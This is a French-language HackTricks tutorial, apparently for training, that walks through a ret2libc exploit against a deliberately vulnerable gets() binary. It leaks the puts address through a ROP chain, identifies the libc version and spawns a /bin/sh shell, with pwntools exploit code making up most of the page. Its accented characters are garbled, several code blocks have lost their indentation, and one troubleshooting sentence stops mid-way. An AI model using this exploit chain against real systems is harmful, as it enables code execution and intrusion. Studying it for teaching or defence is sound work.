# Fuite de l'adresse libc avec ROP

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## R√©sum√© rapide

1. **Trouvez** l'**offset** de d√©bordement
2. **Trouvez** le gadget `POP_RDI`, `PUTS_PLT` et `MAIN`
3. Utilisez les gadgets pr√©c√©dents pour **fuir l'adresse m√©moire** de puts ou d'une autre fonction libc et **trouvez la version libc** ([t√©l√©chargez-la](https://libc.blukat.me))
4. Avec la biblioth√®que, **calculez le ROP et exploitez-le**

## Autres tutoriels et binaires pour pratiquer

Ce tutoriel va exploiter le code/binaire propos√© dans ce tutoriel : [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Autres tutoriels utiles : [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## Code

Nom de fichier : `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - Fuite de mod√®le LIBC

Je vais utiliser le code situ√© ici pour r√©aliser l'exploit.\
T√©l√©chargez l'exploit et placez-le dans le m√™me r√©pertoire que le binaire vuln√©rable et fournissez les donn√©es n√©cessaires au script :

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- Trouver l'offset

Le mod√®le a besoin d'un offset avant de continuer avec l'exploit. Si un offset est fourni, il ex√©cutera le code n√©cessaire pour le trouver (par d√©faut `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**Ex√©cutez** `python template.py`, une console GDB s'ouvrira avec le programme en cours de plantage. √Ä l'int√©rieur de cette **console GDB**, ex√©cutez `x/wx $rsp` pour obtenir les **octets** qui allaient √©craser le RIP. Enfin, obtenez le **d√©calage** en utilisant une console **python** :
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../../.gitbook/assets/image (140).png>)

Apr√®s avoir trouv√© le d√©calage (dans ce cas 40), changez la variable OFFSET √† l'int√©rieur du mod√®le en utilisant cette valeur.\
`OFFSET = "A" * 40`

Une autre fa√ßon serait d'utiliser : `pattern create 1000` -- _ex√©cutez jusqu'√† ret_ -- `pattern seach $rsp` depuis GEF.

## 2- Trouver des Gadgets

Maintenant, nous devons trouver des gadgets ROP √† l'int√©rieur du binaire. Ces gadgets ROP seront utiles pour appeler `puts` afin de trouver la **libc** utilis√©e, et plus tard pour **lancer l'exploit final**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
Le `PUTS_PLT` est n√©cessaire pour appeler la **fonction puts**.\
Le `MAIN_PLT` est n√©cessaire pour rappeler la **fonction main** apr√®s une interaction pour **exploiter** le d√©bordement **√† nouveau** (rondes infinies d'exploitation). **Il est utilis√© √† la fin de chaque ROP pour rappeler le programme**.\
Le **POP\_RDI** est n√©cessaire pour **passer** un **param√®tre** √† la fonction appel√©e.

√Ä cette √©tape, vous n'avez pas besoin d'ex√©cuter quoi que ce soit car tout sera trouv√© par pwntools pendant l'ex√©cution.

## 3- Trouver la biblioth√®que libc

Il est maintenant temps de trouver quelle version de la **libc** est utilis√©e. Pour ce faire, nous allons **leaker** l'**adresse** en m√©moire de la **fonction** `puts` et ensuite nous allons **chercher** dans quelle **version de la biblioth√®que** se trouve la version de puts √† cette adresse.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
Pour ce faire, la ligne la plus importante du code ex√©cut√© est :
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Cela enverra quelques octets jusqu'√† ce que **l'√©crasement** du **RIP** soit possible : `OFFSET`.\
Ensuite, il d√©finira l'**adresse** du gadget `POP_RDI` afin que la prochaine adresse (`FUNC_GOT`) soit enregistr√©e dans le registre **RDI**. C'est parce que nous voulons **appeler puts** **en lui passant** l'**adresse** de `PUTS_GOT` car l'adresse en m√©moire de la fonction puts est enregistr√©e √† l'adresse point√©e par `PUTS_GOT`.\
Apr√®s cela, `PUTS_PLT` sera appel√© (avec `PUTS_GOT` √† l'int√©rieur du **RDI**) afin que puts **lise le contenu** √† l'int√©rieur de `PUTS_GOT` (**l'adresse de la fonction puts en m√©moire**) et **l'affiche**.\
Enfin, **la fonction principale est appel√©e √† nouveau** afin que nous puissions exploiter le d√©bordement √† nouveau.

De cette mani√®re, nous avons **tromp√© la fonction puts** pour **afficher** l'**adresse** en **m√©moire** de la fonction **puts** (qui se trouve dans la biblioth√®que **libc**). Maintenant que nous avons cette adresse, nous pouvons **chercher quelle version de libc est utilis√©e**.

![](<../../../../../.gitbook/assets/image (141).png>)

Comme nous **exploitons** un binaire **local**, il n'est **pas n√©cessaire** de d√©terminer quelle version de **libc** est utilis√©e (il suffit de trouver la biblioth√®que dans `/lib/x86_64-linux-gnu/libc.so.6`).\
Mais, dans le cas d'une exploitation √† distance, je vais expliquer ici comment vous pouvez la trouver :

### 3.1- Recherche de la version de libc (1)

Vous pouvez rechercher quelle biblioth√®que est utilis√©e sur la page web : [https://libc.blukat.me/](https://libc.blukat.me)\
Cela vous permettra √©galement de t√©l√©charger la version d√©couverte de **libc**

![](<../../../../../.gitbook/assets/image (142).png>)

### 3.2- Recherche de la version de libc (2)

Vous pouvez √©galement faire :

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Cela prendra un certain temps, soyez patient.\
Pour que cela fonctionne, nous avons besoin de :

* Nom du symbole libc : `puts`
* Adresse libc divulgu√©e : `0x7ff629878690`

Nous pouvons d√©terminer quelle **libc** est tr√®s probablement utilis√©e.
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Nous obtenons 2 correspondances (vous devriez essayer la deuxi√®me si la premi√®re ne fonctionne pas). T√©l√©chargez la premi√®re :
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
Copiez la libc depuis `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` vers notre r√©pertoire de travail.

### 3.3- Autres fonctions √† leak
```python
puts
printf
__libc_start_main
read
gets
```
## 4- Trouver l'adresse libc bas√©e & exploiter

√Ä ce stade, nous devrions conna√Ætre la biblioth√®que libc utilis√©e. Comme nous exploitons un binaire local, j'utiliserai simplement : `/lib/x86_64-linux-gnu/libc.so.6`

Donc, au d√©but de `template.py`, changez la variable **libc** en : `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #D√©finir le chemin de la biblioth√®que quand on le sait`

En donnant le **chemin** √† la **biblioth√®que libc**, le reste de l'**exploit va √™tre automatiquement calcul√©**.

√Ä l'int√©rieur de la fonction `get_addr`, l'**adresse de base de libc** va √™tre calcul√©e :
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
Notez que **l'adresse de base finale de libc doit se terminer par 00**. Si ce n'est pas votre cas, vous pourriez avoir fuit√© une biblioth√®que incorrecte.
{% endhint %}

Ensuite, l'adresse de la fonction `system` et l'**adresse** de la cha√Æne _"/bin/sh"_ vont √™tre **calcul√©es** √† partir de l'**adresse de base** de **libc** et donn√©es √† la **biblioth√®que libc.**
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Enfin, l'exploit d'ex√©cution /bin/sh va √™tre pr√©par√© et envoy√© :
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Let's explain this final ROP.\
Le dernier ROP (`rop1`) a de nouveau appel√© la fonction principale, puis nous pouvons **exploiter √† nouveau** le **d√©bordement** (c'est pourquoi le `OFFSET` est ici encore). Ensuite, nous voulons appeler `POP_RDI` pointant vers l'**adresse** de _"/bin/sh"_ (`BINSH`) et appeler la fonction **system** (`SYSTEM`) car l'adresse de _"/bin/sh"_ sera pass√©e comme param√®tre.\
Enfin, l'**adresse de la fonction exit** est **appel√©e** afin que le processus **se termine proprement** et qu'aucune alerte ne soit g√©n√©r√©e.

**De cette fa√ßon, l'exploit ex√©cutera un \_/bin/sh**\_\*\* shell.\*\*

![](<../../../../../.gitbook/assets/image (143).png>)

## 4(2)- Utiliser ONE\_GADGET

Vous pouvez √©galement utiliser [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget) pour obtenir un shell au lieu d'utiliser **system** et **"/bin/sh". ONE\_GADGET** trouvera √† l'int√©rieur de la biblioth√®que libc un moyen d'obtenir un shell en utilisant juste une **adresse ROP**.\
Cependant, normalement, il y a certaines contraintes, les plus courantes et faciles √† √©viter sont comme `[rsp+0x30] == NULL`. Comme vous contr√¥lez les valeurs √† l'int√©rieur du **RSP**, vous devez juste envoyer quelques valeurs NULL suppl√©mentaires afin d'√©viter la contrainte.

![](<../../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT FILE

Vous pouvez trouver un mod√®le pour exploiter cette vuln√©rabilit√© ici :

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## Probl√®mes courants

### MAIN\_PLT = elf.symbols\['main'] non trouv√©

Si le symbole "main" n'existe pas. Alors vous pouvez trouver o√π se trouve le code principal :
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
et d√©finissez l'adresse manuellement :
```python
MAIN_PLT = 0x401080
```
### Puts non trouv√©

Si le binaire n'utilise pas Puts, vous devriez v√©rifier s'il utilise

### `sh: 1: %s%s%s%s%s%s%s%s: non trouv√©`

Si vous trouvez cette **erreur** apr√®s avoir cr√©√© **tous** les exploits : `sh: 1: %s%s%s%s%s%s%s%s: non trouv√©`

Essayez de **soustraire 64 octets √† l'adresse de "/bin/sh"** :
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
